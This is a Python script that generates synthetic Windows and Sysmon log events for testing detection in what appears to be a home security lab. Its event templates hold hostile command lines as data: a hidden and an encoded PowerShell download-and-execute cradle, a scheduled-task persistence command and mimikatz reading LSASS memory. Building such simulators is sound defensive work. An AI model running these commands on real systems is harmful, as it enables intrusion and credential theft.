#!/usr/bin/env python3
"""
HomeSOC Windows Event Simulator
Generates synthetic Windows Security (Event ID 4624, 4698) and
Sysmon (Event ID 1, 10) events simulating MITRE ATT&CK techniques.
Outputs to JSON file, Syslog UDP/TCP, or stdout.
"""

import argparse
import datetime
import json
import os
import random
import socket
import sys
import time

TECHNIQUES = {
    "T1059": {
        "name": "Command and Scripting Interpreter: PowerShell",
        "tactic": "Execution",
        "events": [
            {
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "User": "HOMELAB\\victim_user",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "ParentCommandLine": "C:\\Windows\\explorer.exe",
                "CurrentDirectory": "C:\\Users\\victim_user\\Downloads",
                "Hashes": "SHA256=DE5E562A961EEBE1ECBFA4E656DE1D0DE94AE6A9DF24FA95048DE7DB8BEE1A99",
                "mitre_technique": "T1059.001"
            },
            {
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/beacon.ps1')\"",
                "User": "HOMELAB\\admin",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "ParentCommandLine": "cmd.exe /c start.bat",
                "CurrentDirectory": "C:\\Windows\\Temp",
                "Hashes": "SHA256=11223344556677889900AABBCCDDEEFF11223344556677889900AABBCCDDEEFF",
                "mitre_technique": "T1059.001"
            }
        ]
    },
    "T1053": {
        "name": "Scheduled Task/Job: Scheduled Task",
        "tactic": "Persistence / Privilege Escalation",
        "events": [
            {
                "EventID": 4698,
                "Channel": "Security",
                "Provider_Name": "Microsoft-Windows-Security-Auditing",
                "TaskName": "\\Microsoft\\Windows\\Maintenance\\SystemUpdateService",
                "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Actions><Exec><Command>C:\\Users\\Public\\updater.exe</Command></Exec></Actions></Task>",
                "SubjectUserName": "Administrator",
                "SubjectDomainName": "HOMELAB",
                "SubjectLogonId": "0x3E7",
                "CommandLine": "schtasks /create /tn \"SystemUpdateService\" /tr \"C:\\Users\\Public\\updater.exe\" /sc minute /mo 15 /ru \"SYSTEM\"",
                "mitre_technique": "T1053.005"
            },
            {
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "Image": "C:\\Windows\\System32\\schtasks.exe",
                "CommandLine": "schtasks.exe /create /tn \"DailyRecon\" /tr \"powershell.exe -w hidden -enc IAA...\" /sc onstart",
                "User": "HOMELAB\\svc_backup",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "mitre_technique": "T1053.005"
            }
        ]
    },
    "T1078": {
        "name": "Valid Accounts: Anomalous Privileged Logon",
        "tactic": "Initial Access / Defense Evasion",
        "events": [
            {
                "EventID": 4624,
                "Channel": "Security",
                "Provider_Name": "Microsoft-Windows-Security-Auditing",
                "LogonType": 10,
                "TargetUserName": "Administrator",
                "TargetDomainName": "HOMELAB",
                "TargetLogonId": "0x12F8B",
                "IpAddress": "203.0.113.45",
                "IpPort": 51928,
                "WorkstationName": "EXTERNAL-ATTACK-NODE",
                "ProcessName": "C:\\Windows\\System32\\svchost.exe",
                "LogonProcessName": "User32",
                "AuthenticationPackageName": "Negotiate",
                "mitre_technique": "T1078"
            },
            {
                "EventID": 4624,
                "Channel": "Security",
                "Provider_Name": "Microsoft-Windows-Security-Auditing",
                "LogonType": 3,
                "TargetUserName": "DomainAdmin",
                "TargetDomainName": "HOMELAB",
                "IpAddress": "198.51.100.12",
                "IpPort": 445,
                "WorkstationName": "UNKNOWN-PC",
                "mitre_technique": "T1078"
            }
        ]
    },
    "T1003": {
        "name": "OS Credential Dumping: LSASS Memory",
        "tactic": "Credential Access",
        "events": [
            {
                "EventID": 10,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "SourceImage": "C:\\Users\\Public\\mimikatz.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1010",
                "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d454|C:\\Windows\\System32\\KERNELBASE.dll+2c02e",
                "SourceUser": "HOMELAB\\attacker",
                "mitre_technique": "T1003.001"
            }
        ]
    },
    "T1082": {
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "events": [
            {
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "Image": "C:\\Windows\\System32\\whoami.exe",
                "CommandLine": "whoami /all",
                "User": "HOMELAB\\victim_user",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "mitre_technique": "T1082"
            },
            {
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Provider_Name": "Microsoft-Windows-Sysmon",
                "Image": "C:\\Windows\\System32\\systeminfo.exe",
                "CommandLine": "systeminfo.exe",
                "User": "HOMELAB\\victim_user",
                "mitre_technique": "T1082"
            }
        ]
    }
}


def build_event(technique_key=None):
    if not technique_key or technique_key.upper() == "ALL":
        tech = random.choice(list(TECHNIQUES.keys()))
    else:
        tech = technique_key.upper()
        if tech not in TECHNIQUES:
            raise ValueError(f"Unknown technique '{technique_key}'. Supported: {list(TECHNIQUES.keys())}")

    template = random.choice(TECHNIQUES[tech]["events"])
    event = dict(template)
    event["timestamp"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
    event["Computer"] = f"WIN-SRV-{random.randint(10, 99)}.homelab.local"
    event["EventRecordID"] = random.randint(100000, 999999)
    event["source"] = "windows_sim"
    event["mitre_tactic"] = TECHNIQUES[tech]["tactic"]
    return event


def to_syslog_line(event):
    ts = datetime.datetime.now().strftime("%b %d %H:%M:%S")
    host = event.get("Computer", "WIN-ENDPOINT-01")
    eid = event.get("EventID", 1)
    provider = event.get("Provider_Name", "WinSim")

    if eid == 10:
        msg = f"EventID=10 SourceImage=\"{event.get('SourceImage', '')}\" TargetImage=\"{event.get('TargetImage', '')}\" GrantedAccess={event.get('GrantedAccess', '0x1010')}"
    elif eid == 4624:
        msg = f"EventID=4624 User={event.get('TargetUserName', 'Admin')} Image=\"C:\\Windows\\System32\\lsass.exe\" CommandLine=\"LogonType={event.get('LogonType', 10)} From {event.get('IpAddress', '10.0.0.1')}\""
    else:
        msg = f"EventID={eid} User={event.get('User', event.get('SubjectUserName', 'system'))} Image=\"{event.get('Image', '')}\" CommandLine=\"{event.get('CommandLine', '')}\""

    return f"<{13}> {ts} {host} {provider}: {msg}"


def send_syslog(message, host="127.0.0.1", port=514, proto="udp"):
    data = message.encode("utf-8")
    if proto.lower() == "udp":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (host, port))
        sock.close()
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        sock.sendall(data + b"\n")
        sock.close()


def main():
    parser = argparse.ArgumentParser(description="HomeSOC Windows Endpoint Simulation Generator")
    parser.add_argument("--count", type=int, default=5, help="Number of events to generate (default: 5)")
    parser.add_argument("--technique", default="ALL", help="MITRE technique: T1059, T1053, T1078, T1003, T1082, or ALL")
    parser.add_argument("--format", choices=["json", "syslog"], default="json", help="Log output format (default: json)")
    parser.add_argument("--output", choices=["stdout", "file", "syslog"], default="stdout", help="Destination (default: stdout)")
    parser.add_argument("--file", default="logs/windows_simulated.json", help="File destination when --output file is used")
    parser.add_argument("--syslog-host", default="127.0.0.1", help="Syslog host (default: 127.0.0.1)")
    parser.add_argument("--syslog-port", type=int, default=514, help="Syslog port (default: 514)")
    parser.add_argument("--syslog-proto", choices=["udp", "tcp"], default="udp", help="Syslog protocol")
    parser.add_argument("--interval", type=float, default=0.0, help="Seconds to sleep between events")

    args = parser.parse_args()

    file_handle = None
    if args.output == "file":
        os.makedirs(os.path.dirname(os.path.abspath(args.file)), exist_ok=True)
        file_handle = open(args.file, "a", encoding="utf-8")

    try:
        for i in range(args.count):
            event = build_event(args.technique)
            if args.format == "json":
                line = json.dumps(event)
            else:
                line = to_syslog_line(event)

            if args.output == "stdout":
                print(line)
            elif args.output == "file":
                file_handle.write(line + "\n")
                file_handle.flush()
                print(f"[+] Wrote simulated event {i+1}/{args.count} to {args.file} ({event.get('mitre_technique')})")
            elif args.output == "syslog":
                send_syslog(line, host=args.syslog_host, port=args.syslog_port, proto=args.syslog_proto)
                print(f"[+] Forwarded event {i+1}/{args.count} via {args.syslog_proto.upper()} to {args.syslog_host}:{args.syslog_port} ({event.get('mitre_technique')})")

            if args.interval > 0 and i < args.count - 1:
                time.sleep(args.interval)
    finally:
        if file_handle:
            file_handle.close()


if __name__ == "__main__":
    main()
